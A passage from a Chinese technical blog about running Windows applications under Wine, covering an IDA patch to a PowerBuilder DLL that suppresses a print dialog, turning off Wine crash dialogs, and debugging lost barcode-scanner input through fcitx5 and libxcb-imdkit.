    <content><![CDATA[<h1 id="ida修改目标dll"><a href="#ida修改目标dll" class="headerlink" title="ida修改目标dll"></a>ida修改目标dll</h1><span id="more"></span>

<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>使用ida修改pb工具开发的一款应用中的打印模块，该应用会在打印中会弹出 “1 of 1 ….”对话框，已知该字符串通过”set_window_text”函数实现对话框显示</p>
<h2 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h2><ol>
<li><p>该应用使用pb进行开发，根据学习PowerBuilder发现在 PowerBuilder 中，打印功能通常由 DataWindow 模块处理。pbdwe90.dll 是与 DataWindow 相关的一个核心动态链接库，负责 DataWindow 的渲染和数据处理。打印操作会通过 DataWindow 进行，因为 DataWindow 提供了格式化数据、生成报表和处理打印的功能。</p>
</li>
<li><p>通过ida打开该dll文件，弹出选择界面，该界面是选择不同架构类型处理器，由于不同架构处理器对其指令集有不同，我这里选择Metapc，通用性x86架构进行打开</p>
</li>
</ol>
<p><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/3.png" alt="图3"></p>
<ol start="3">
<li>根据wine下日志发现调用set_window_text函数附近是调用StartDocW，在该dll中调用打印函数较少，根据这个调用找到其中上下文</li>
</ol>
<p><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/4.png" alt="图4"></p>
<ol start="4">
<li>从ida下打开导入表，找到StartDoc函数</li>
</ol>
<p><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/5.png" alt="图5"><br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/111.png" alt="图111"><br>5. 双击该函数，右键点击<code>Jump to xref to operand</code><br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/6.png"></p>
<ol start="6">
<li><p>键盘按键f5，生成反汇编窗口中的函数对应的伪代码<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/7.png" alt="图7"></p>
</li>
<li><p>根据对伪代码学习，发现其调用<code>SetDlgItemTextA</code>函数，比较像是弹窗中的文本内容，这边在wine中增加该函数日志</p>
</li>
</ol>
<p><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/8.png" alt="图8"></p>
<ol start="8">
<li><p>发现函数中的字符串内容与弹窗的内容一致，为<code>set_window_text</code>函数中的内容<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/9.png" alt="图9"></p>
</li>
<li><p>SetDlgItemTextA函数为设置文本框内容，第一个参数为窗口句柄，在伪代码中找到创建该句柄位置<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/10.png" alt="图10"></p>
</li>
<li><p>该对话框在if判断中进行窗口创建，目前准备修改if判断让其无法进入判断。首先将该语句变成指令汇编<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/15.png"></p>
</li>
<li><p>找到该if判断语句地址，该汇编为cmp-&gt;jnz,意思为比较若不为0则跳转<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/15.png" alt="图15"></p>
</li>
<li><p>修改很简单，将其判断改反即可，把jnz修改为jz，修改完如下图<br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/12.png" alt="图12"><br><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/13.png" alt="图13"></p>
</li>
<li><p>将其修改的patch进行保存即可</p>
</li>
</ol>
<p><img src="/2024/08/26/wine-IDA%E4%BF%AE%E6%94%B9dll%E6%96%87%E4%BB%B6/16.png" alt="图16"></p>
<h2 id="方案验证"><a href="#方案验证" class="headerlink" title="方案验证"></a>方案验证</h2><p>将修改的dll替换至容器进行打印，对话框在打印过程中未显示，set_window_text函数也为调用，修改成功</p>
]]></content>
      <categories>
        <category>ida</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】关闭wine下崩溃窗口</title>
    <url>/2024/08/05/wine-%E5%85%B3%E9%97%ADwine%E4%B8%8B%E5%B4%A9%E6%BA%83%E7%AA%97%E5%8F%A3/</url>
    <content><![CDATA[<h1 id="关闭wine下崩溃窗口"><a href="#关闭wine下崩溃窗口" class="headerlink" title="关闭wine下崩溃窗口"></a>关闭wine下崩溃窗口</h1><span id="more"></span>
<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>如何关闭wine下崩溃时的弹窗<br><img src="/2024/08/05/wine-%E5%85%B3%E9%97%ADwine%E4%B8%8B%E5%B4%A9%E6%BA%83%E7%AA%97%E5%8F%A3/1.png" alt="图1"></p>
<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
<li>运行命令：WINEPREFIX=”容器路径”  wine “regedit” 启动对应容器注册表<br><img src="/2024/08/05/wine-%E5%85%B3%E9%97%ADwine%E4%B8%8B%E5%B4%A9%E6%BA%83%E7%AA%97%E5%8F%A3/2.png" alt="图2"></li>
<li>找到注册表中的Software\Wine\WineDbg添加一项 “ShowCrashDialog”=”0”<br><img src="/2024/08/05/wine-%E5%85%B3%E9%97%ADwine%E4%B8%8B%E5%B4%A9%E6%BA%83%E7%AA%97%E5%8F%A3/3.png" alt="图3"></li>
</ol>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】易联众扫码丢失问题分析</title>
    <url>/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="易联众扫码丢失问题分析"><a href="#易联众扫码丢失问题分析" class="headerlink" title="易联众扫码丢失问题分析"></a>易联众扫码丢失问题分析</h1><span id="more"></span>
<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>易联众五代扫码机器，在wine下扫描医保码或者就诊单存在字符丢失情况，问题复现率与机器性能强度成反比。在现场中存在一台性能较差的赛扬cpu机器，复现问题成功率在百分之八十左右。</p>
<p>window下输入框正常现象如下图：</p>
<p><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/1.png" alt="图1"></p>
<p>nfs下wine异常现象如下图：</p>
<p><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/2.png" alt="图2"></p>
<p><em><strong>经验证问题复现环境为：</strong></em></p>
<p><em>软件环境</em>：amd架构，nfs-5.0-U212版本</p>
<p><em>硬件环境</em>：cpu J1900/四核心</p>
<p><em>wine版本</em>：上游wine-8.6</p>
<p><em>输入法版本</em>：fcitx5_5.0.5（fcitx5为开源代码并社区讨论更新较多，在分析此问题时可以进行源码对照）</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>通过对上次易联众扫码大小写显示不正常的问题分析学习后，首先可以排除是硬件问题，猜测该问题大致原因可能为：</p>
<ul>
<li>猜测1：wine下存在显示问题，导致字符未能正常显示至系统中。</li>
<li>猜测2：在系统中，按键消息首先发送至输入法中如下图，由输入法进行相应在发送至窗口，怀疑输入法接收或发送这块存在自身bug,未能将完整消息发送至窗口<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/3.png" alt="图3"></li>
</ul>
<h3 id="猜测1"><a href="#猜测1" class="headerlink" title="猜测1"></a>猜测1</h3><ol>
<li><p>在学习和观察wine代码，发现他的事件统一处理在<code>dlls/winex11.drv/event.c</code>文件的process_events中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">process_events</span><span class="params">( Display *display, Bool (*filter)(Display*, XEvent*,XPointer), ULONG_PTR arg )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    XEvent event, prev_event;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    BOOL queued = FALSE;</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">event_merge_action</span> <span class="title">action</span> =</span> MERGE_DISCARD;</span><br><span class="line"></span><br><span class="line">    prev_event.type = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (XCheckIfEvent( display, &amp;event, filter, (<span class="keyword">char</span> *)arg ))</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span> (XFilterEvent( &amp;event, None ))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ‘’‘’</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (prev_event.type) queued |= call_event_handler( display, &amp;prev_event );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在经过消息过滤与消息合并后通过<code>call_event_handler</code>进行对每个消息分类处理，针对键盘按下的操作，使用<code>X11DRV_KeyEvent</code>进行处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">X11DRV_KeyEvent</span><span class="params">( HWND hwnd, XEvent *xev )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    XKeyEvent *event = &amp;xev-&gt;xkey;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">24</span>];</span><br><span class="line">    <span class="keyword">char</span> *Str = buf;</span><br><span class="line">    KeySym keysym = <span class="number">0</span>;</span><br><span class="line">    WORD vkey = <span class="number">0</span>, bScan;</span><br><span class="line">    DWORD dwFlags;</span><br><span class="line">    <span class="keyword">int</span> ascii_chars;</span><br><span class="line">    XIC xic = X11DRV_get_ic( hwnd );</span><br><span class="line">    DWORD event_time = EVENT_x11_time_to_win32_time(event-&gt;time);</span><br><span class="line">    Status status = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    TRACE_(key)(<span class="string">&quot;type %d, window %lx, state 0x%04x, keycode %u\n&quot;</span>,</span><br><span class="line">		event-&gt;type, event-&gt;window, event-&gt;state, event-&gt;keycode);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (event-&gt;type == KeyPress) update_user_time( event-&gt;time );</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clients should pass only KeyPress events to XmbLookupString */</span></span><br><span class="line">    <span class="keyword">if</span> (xic &amp;&amp; event-&gt;type == KeyPress)</span><br><span class="line">    &#123;</span><br><span class="line">        ........</span><br></pre></td></tr></table></figure></li>
<li><p>打印wine中的<code>key</code>的日志通道，对比发现wine未收到已丢失的键盘按键事件，需要继续分析此问题<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/4.png" alt="图4"></p>
</li>
</ol>
<h3 id="猜测2："><a href="#猜测2：" class="headerlink" title="猜测2："></a>猜测2：</h3><ol>
<li><p>Fcitx 的基本架构是客户端/服务器架构，客户端，在 Fcitx 里面对应的词是“输入上下文（Input Context）”，当一个程序不能用输入法的时候，一般最常见的情况就是这个程序并没有采用正确的方式和输入法进行通信。目前在 Linux 下的客户端通信方式类型如下：<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/12.png" alt="图12"></p>
<ul>
<li>xim：在 X11 下理论上是通用的，实现由 Xlib 完成。和 Xlib 的事件处理结合非常紧密，采用了一种直接原生和 Xlib 按键转化字符串的方式来实现。但 Qt 5 和 SDL 2 由于是通过 xcb 来处理 X11 的通信，无法使用xim协议，所以已去除此协议。虽然 Xlib 现在内部已经变成了基于 xcb 的实现，但是，如果原生就是 xcb 的情况，是无法反过来再用 xlib 的。但是在 Fcitx 5 上，开发了一个纯 xcb 的 XIM 实现模块-libxcb-imdkit。</li>
<li>dbusfrontend：这个就是 Fcitx 自己的协议了，基于 dbus 实现的。需要程序配合使用对应的 DBus 接口，主要就是通过 IM Module。而这个主要就是通过常见的两板斧：GTK_IM_MODULE 和 QT_IM_MODULE 环境变量控制，顾名思义Gtk/Qt实现的界面窗口使用此协议。</li>
<li>waylandim：在wayland下实现了 zwp_input_method_v1 和 zwp_input_method_v2 的支持。</li>
<li>fcitx4frontend 和 ibusfrontend：模拟原本 Fcitx 4 自己的 IM Module 协议和模拟 IBus 的。</li>
</ul>
</li>
<li><p>通过对wine下的输入法模块学习，发现wine通过xim框架与输入法进行通讯，wine下输入法创建比较关键的地方是调用的<code>XCreateFontSet</code>与<code>XVaCreateNestedList</code></p>
</li>
<li><p>将wine下的输入法关键地方提炼出来，使用x11实现一个窗口输入框</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">openxim</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ‘’‘’‘’</span><br><span class="line">    xim = XOpenIM(display, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (xim == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open input method\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* create callbacks for the input method */</span></span><br><span class="line">	destroy.client_data = <span class="literal">NULL</span>;</span><br><span class="line">	destroy.callback = (XICProc)icdestroy;</span><br><span class="line"></span><br><span class="line">    preeditstyle = XIMPreeditCallbacks;</span><br><span class="line">	statusstyle = XIMStatusNothing;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; imstyles-&gt;count_styles; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (imstyles-&gt;supported_styles[i] &amp; XIMPreeditCallbacks) &#123;</span><br><span class="line">			preeditstyle = XIMPreeditCallbacks;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">    ‘’‘’‘’</span><br><span class="line">    XFontSet fontset = XCreateFontSet(display, <span class="string">&quot;fixed&quot;</span>, &amp;missing_charset_list, &amp;missing_charset_count, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* create list of values for input context */</span></span><br><span class="line">	preedit = XVaCreateNestedList(<span class="number">0</span>, XNFontSet, fontset,</span><br><span class="line">                                      XNPreeditStartCallback, &amp;start,</span><br><span class="line">                                      XNPreeditDoneCallback, &amp;done,</span><br><span class="line">                                      XNPreeditDrawCallback, &amp;draw,</span><br><span class="line">                                      XNPreeditCaretCallback, &amp;caret,</span><br><span class="line">                                      <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (preedit == <span class="literal">NULL</span>)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;XVaCreateNestedList: could not create nested list&quot;</span>);</span><br><span class="line">        <span class="comment">/* create input context */</span></span><br><span class="line">	xic = XCreateIC(xim,</span><br><span class="line">	                   XNInputStyle, preeditstyle | statusstyle,</span><br><span class="line">	                   XNPreeditAttributes, preedit,</span><br><span class="line">	                   XNClientWindow, window,</span><br><span class="line">	                   XNDestroyCallback, &amp;destroy,</span><br><span class="line">	                   <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (xic == <span class="literal">NULL</span>)</span><br><span class="line">		errx(<span class="number">1</span>, <span class="string">&quot;XCreateIC: could not obtain input method&quot;</span>);</span><br><span class="line">    ‘’‘’‘’‘’</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>进行扫码测试如下图发现也是存在内容丢失的，通过本轮测试基本可以排除扫码丢失非wine下问题<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/5.png" alt="图5"></p>
</li>
<li><p>开启fcitx5下全量日志通道<code>fcitx5 -r --verbose *=5</code>，进行扫码时，若存在消息丢失则输出大量<code>XIM filtered event</code><br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/6.png" alt="图6"></p>
</li>
<li><p>查看fcitx5对应版本的源码，发现在调用xcb_im_filter_event函数中返回true时会打印<code>XIM filtered event</code>日志，xcb_im_filter_event函数为<code>libxcb-imdkit</code>函数实现，通过步骤1的学习，我们发现此模块功能为过滤和处理与输入法相关的 X11 事件。<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/13.png" alt="图13"></p>
</li>
<li><p>查看此模块的源码，发现使用如下四个函数进行消息事件的判断处理</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">xcb_im_filter_event</span><span class="params">(<span class="keyword">xcb_im_t</span> *im, <span class="keyword">xcb_generic_event_t</span> *event)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> _xcb_im_filter_xconnect_message(im, event) ||</span><br><span class="line">           _xcb_im_filter_selection_request(im, event) ||</span><br><span class="line">           _xcb_im_filter_client(im, event) ||</span><br><span class="line">           _xcb_im_filter_destroy_window(im, event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<ul>
<li>_xcb_im_filter_xconnect_message：过滤并处理与 XIM 连接相关的消息。</li>
<li>_xcb_im_filter_selection_request：过滤并处理 X11 选择请求事件。</li>
<li>_xcb_im_filter_client：过滤并处理来自客户端的输入法相关事件。</li>
<li>_xcb_im_filter_destroy_window：过滤并处理窗口销毁事件。</li>
</ul>
<ol start="8">
<li><p>在键盘事件丢失时，是通过_xcb_im_filter_client进行处理过滤，经过源码学习发现一个比较关键的函数调用：<code> xcb_get_property_reply_t *reply = xcb_get_property_reply(conn, cookie, NULL);</code>，经过日志打印其<code>reply-&gt;type</code>发现其值为0，经过对比在正常扫码的时候<code>reply-&gt;type</code>均不为0.<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/7.png" alt="图7"><br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/8.png" alt="图8"></p>
</li>
<li><p>xcb_get_property_reply函数用于从 X 服务器获取属性请求的回复，当<code>reply-&gt;type</code>为0时说明请求的属性不存在获取错误，但是在扫码时，按键属性是偶现丢失并非全部丢失，所以需要继续定位type为0的具体原因。</p>
</li>
<li><p>由于本地的<code>libxcb-imdkit</code>版本为1.0.2为较低版本，上游最新版本为1.0.8,类似这种严重问题大概率中间版本存在解决，翻阅代码的committed message,发现在1.0.3到1.0.5时存在一个提交，用于解决事件速度较快字符丢失的问题，通过阅读 committed message 发现该问题原因大致为：在 XIM 协议中，为了传递输入法相关的信息，客户端和服务器之间使用窗口属性（window property）来进行通信。这些属性的名称是轮换使用的，类似于一个循环缓冲区。Xlib 使用一个固定的轮换周期（cycle 20）。这意味着属性名称会在 20 个不同的名称之间循环使用。如果客户端发送事件太快，可能会导致属性在被读取之前被覆盖。这会导致读取属性时出现问题。需要增加一个更大的缓冲区，确保所有数据都被读取。这是为了避免由于属性名称轮换而导致的数据丢失。。<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/9.png" alt="图9"></p>
</li>
</ol>
<ol start="11">
<li>更新<code>libxcb-imdkit</code>后再进行测试验证，发现新版本可以，能够正常运行使用。<br><img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/10.png" alt="图10"></li>
</ol>
<h2 id="分析结论"><a href="#分析结论" class="headerlink" title="分析结论"></a>分析结论</h2><pre><code>通过上述分析与验证代码，可以初步猜测在nfs系统上若使用x11实现的可输入中文界面窗口进行快速输入，会偶现出现字符丢失问题。
</code></pre>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>方案1：卸载输入法，将按键消息直接通过窗管发送至应用，不走输入法则不会出现丢失问题。</li>
<li>方案2：在fcitx5下更新<code>libxcb-imdkit</code>模块版本&gt;=1.0.5，在fcitx4下则需要修复其x11模块的功能。</li>
</ul>
<p>修改后效果如下：<br>    <img src="/2024/06/29/wine-%E6%98%93%E8%81%94%E4%BC%97%E6%89%AB%E7%A0%81%E4%B8%A2%E5%A4%B1%E9%97%AE%E9%A2%98%E5%88%86%E6%9E%90/11.png" alt="图11"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这个问题需要对x11和输入法框架比较熟悉，理解输入法与几个基础界面UI框架通讯协议流程。由于输入法与不同框架实现的界面程序使用不同协议，会让开发者对问题判断存在疑惑，特别是在wps/终端/文本编辑器等大众可输入应用进行扫码测试时，未能出现字符丢失情况，开发者就会怀疑是wine本身问题，此时就需要阅读wine下关于x11代码，进行模块提炼完成demo测试，才会更精准理解认识问题所在。</p>
]]></content>
      <categories>
        <category>wine</category>
      </categories>
      <tags>
        <tag>wine</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux技术分享】赛扬自助机系统扫码大小异常问题</title>
    <url>/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h1 id="赛扬自助机系统扫码大小异常问题"><a href="#赛扬自助机系统扫码大小异常问题" class="headerlink" title="赛扬自助机系统扫码大小异常问题"></a>赛扬自助机系统扫码大小异常问题</h1><span id="more"></span>
<h2 id="问题概述"><a href="#问题概述" class="headerlink" title="问题概述"></a>问题概述</h2><p>赛扬自助机上的易联众三代扫码机器扫描门诊就诊指引单时大小存在异常</p>
<p>window下输入框正常现象如下图：</p>
<p><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/1.png" alt="图1"></p>
<p>nfs下wine异常现象如下图：</p>
<p><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/2.png" alt="图2"></p>
<p><em><strong>经验证问题复现环境为：</strong></em></p>
<p><em>软件环境</em>：amd架构，nfs-5.0-U212版本</p>
<p><em>硬件环境</em>：cpu J1900</p>
<p><em>wine版本</em>：上游wine-8.6</p>
<h2 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h2><p>从问题截图猜测该问题大致原因可能为：</p>
<ul>
<li>猜测1：驱动不正确导致机器未能正确发送事件至应用</li>
<li>猜测2：窗管未能正常发送事件至目标窗口</li>
<li>猜测3：wine自身存在问题导致显示错误</li>
</ul>
<h2 id="分析验证"><a href="#分析验证" class="headerlink" title="分析验证"></a>分析验证</h2><h3 id="验证准备"><a href="#验证准备" class="headerlink" title="验证准备"></a>验证准备</h3><ol>
<li><p>为了方便验证首先需要排除是该应用问题还是通用输入框问题，简单实现了一个输入框窗口，简单代码如下：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">HWND hwnd = <span class="built_in">CreateWindow</span>(<span class="string">&quot;MyClass&quot;</span>, <span class="string">&quot;输入框示例&quot;</span>, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, <span class="number">300</span>, <span class="number">200</span>,</span><br><span class="line">                         <span class="literal">NULL</span>, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建输入框</span></span><br><span class="line">HWND hEdit = <span class="built_in">CreateWindow</span>(<span class="string">&quot;EDIT&quot;</span>, <span class="string">&quot;&quot;</span>, WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, <span class="number">50</span>, <span class="number">50</span>, <span class="number">200</span>, <span class="number">25</span>,</span><br><span class="line">                          hwnd, <span class="literal">NULL</span>, hInstance, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显示窗口</span></span><br><span class="line"><span class="built_in">ShowWindow</span>(hwnd, nCmdShow);</span><br><span class="line"><span class="built_in">UpdateWindow</span>(hwnd);</span><br></pre></td></tr></table></figure></li>
<li><p>运行后如下图，发现wine下的输入框在该硬件上现象保持一致，存在同样大小写丢失问题<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/3.png" alt="图3"></p>
<h3 id="猜测1"><a href="#猜测1" class="headerlink" title="猜测1"></a>猜测1</h3></li>
<li><p>介绍一个观察linux系统下硬件事件工具evtest</p>
<ul>
<li>evtest：evtest是打印evdev内核事件的工具，它直接从内核设备读取并打印设备描述的带有值和符号名的事件，可以用来调试鼠标、键盘、触摸板等输入设备evtest通常用于在X.org中调试输入设备的问题，evtest提供了内核的处理信息，根据这些信息。可以判断是内核问题还是X.org问题 输出数据中，“type”是input类型，可以是“EV KEY”、“EV SW”、“EV SND”、“EV LED”或数值<br>value可以是十进制也可以是十六进制，或者是查询的kev/开关/声音/LED的常量名。</li>
</ul>
</li>
<li><p>通过evtest监听指定的硬件发送至内核的事件如图：<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/4.png" alt="图4"></p>
</li>
<li><p>其中value值是按下与松开code值代表按键码，从evtest内核监听看”j”的按下与松开事件与”C”按下与松开事件一致，证明驱动正确的发送事件至内核。</p>
</li>
</ol>
<h3 id="猜测2："><a href="#猜测2：" class="headerlink" title="猜测2："></a>猜测2：</h3><ol>
<li><p>介绍一个观察linux窗口事件的工具xev与查看linux窗口信息工具xwininfo</p>
<ul>
<li>xwininfo：列出窗口的基本几何信息和状态，简单用法是在终端里面执行命令 <code>xwininfo</code> 之后， 此时系统鼠标光标被 <code>xwininfo</code> 捕获，光标变成十字星形状，移动鼠标点击要查看的窗口的任意区域，执行<code>xwininfo</code>的终端输出了该窗口的这些 X11 属性.</li>
<li>xev：xev是一个X Window System的实用程序，用于查看键盘和鼠标的输入事件。</li>
</ul>
</li>
<li><p>通过xwindow获取目标窗口window id再通过xev监听系统发送至窗口消息，如下图：<br><img src="/2024/05/29/wine-%E8%B5%9B%E6%89%AC%E8%87%AA%E5%8A%A9%E6%9C%BA%E7%B3%BB%E7%BB%9F%E6%89%AB%E7%A0%81%E5%A4%A7%E5%B0%8F%E5%BC%82%E5%B8%B8%E9%97%AE%E9%A2%98/5.png" alt="图5"></p>
</li>
<li><p>其中XmbLookupString与XLookupString获取的值均为”J”，证明窗管发送事件无误</p>
</li>
</ol>
<h3 id="猜测3："><a href="#猜测3：" class="headerlink" title="猜测3："></a>猜测3：</h3><ol>
<li>开启wine下关于键盘输入的日志<blockquote>
<p>WINEDEBUG=+timestamp,+pid,+tid,+key,+keyboard,+imm WINEPREFIX=”/opt/winux/hotpot/appstore/drawbloodsef-win-u-1.0nfs1” /opt/winux/wine-all/wine8.6/bin/wine  /home/xm174/桌面/demo.exe &amp;&gt;~/222.txt</p>
</blockquote>
</li>
</ol>
<ol start="2">
<li>过滤KeyRelease|KeyPress事件<blockquote>
